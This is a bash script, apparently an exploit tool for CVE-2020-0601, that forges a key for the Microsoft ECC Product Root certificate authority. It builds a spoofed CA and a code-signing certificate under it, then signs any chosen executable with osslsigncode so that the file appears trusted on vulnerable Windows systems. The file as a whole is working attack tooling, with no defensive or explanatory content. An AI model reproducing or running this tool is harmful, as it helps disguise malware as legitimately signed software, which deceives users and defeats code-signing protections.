#!/bin/bash

usage() { 
	echo "Usage: $0 -c : Create new \"legit\" certificate (CVE-2020-0601)"
	echo "       $0 -s : Sign executable"
}

openssl_conf_create() {
	read -p 'Country Name (2 letter code) []: ' cvalue
	read -p 'State or Province Name (full name) []: ' svalue
	read -p 'Locality Name (eg, city) []: ' lvalue
	read -p 'Organization Name (eg, company) []: ' ovalue
	read -p 'Organizational Unit Name (eg, section) []: ' ouvalue
	read -p 'Common Name (YOUR name) []: ' cnvalue

	if test ! -z "$cvalue"; then c="C = $cvalue"; fi
	if test ! -z "$svalue"; then s="ST = $svalue"; fi
	if test ! -z "$lvalue"; then l="L = $lvalue"; fi
	if test ! -z "$ovalue"; then o="O = $ovalue"; fi
	if test ! -z "$ouvalue"; then ou="OU = $ouvalue"; fi
	if test ! -z "$cnvalue"; then cn="CN = $cnvalue"; fi

cat >$certname/openssl_cs.conf <<EOL
[ req ]
prompt = no
distinguished_name = dn

[ dn ]
$c
$s
$l
$o
$ou
$cn

[ v3_cs ]
basicConstraints        = critical, CA:FALSE
subjectKeyIdentifier    = hash
keyUsage                = digitalSignature
extendedKeyUsage        = codeSigning
EOL
}

create() {
	read -e -p 'Certificate filename: ' certname
	mkdir "$certname"

	ruby CreateKey.rb "MicrosoftECCProductRootCertificateAuthority.cer" 
	mv "spoofed_ca.key" "$certname/spoofed_ca.key"

	echo -e "\n-------------Spoofed CA Information--------------"
	openssl req -new -x509 -key "$certname/spoofed_ca.key" -out "$certname/spoofed_ca.crt"

	openssl ecparam -name secp384r1 -genkey -noout -out "$certname/$certname.key"

	echo -e "\n----------Certificate Owner Information----------"
	openssl_conf_create

	openssl req -new -key "$certname/$certname.key" -out "$certname/cert.csr" -config "$certname/openssl_cs.conf" -reqexts v3_cs

	openssl x509 -req -in "$certname/cert.csr" -CA "$certname/spoofed_ca.crt" -CAkey "$certname/spoofed_ca.key" -CAcreateserial -out "$certname/$certname.crt" -days 3650 -extfile "$certname/openssl_cs.conf" -extensions v3_cs

	openssl pkcs12 -export -in "$certname/$certname.crt" -inkey "$certname/$certname.key" -certfile "$certname/spoofed_ca.crt" -out "$certname/$certname.p12"

	mv "$certname/$certname.p12" "$certname.p12"
	rm -rf "$certname"
}

sign () {
	read -e -p 'Certificate filename (*.pfx/*.p12): ' certname
	read -e -p "Executable filename: " exename
	read -p "Executable title: " exetitle

	osslsigncode sign -pkcs12 "$certname" -n "$exetitle" -t "http://timestamp.digicert.com" -in "$exename" -out "signed_$exename" -h sha256 -askpass
}

if test $# -eq 0; then
	usage
	exit 0
fi

while getopts csh option; do
	case $option in
		(c)
			create;;
		(s)
			sign;;
		(h)
			usage;;
	esac
done
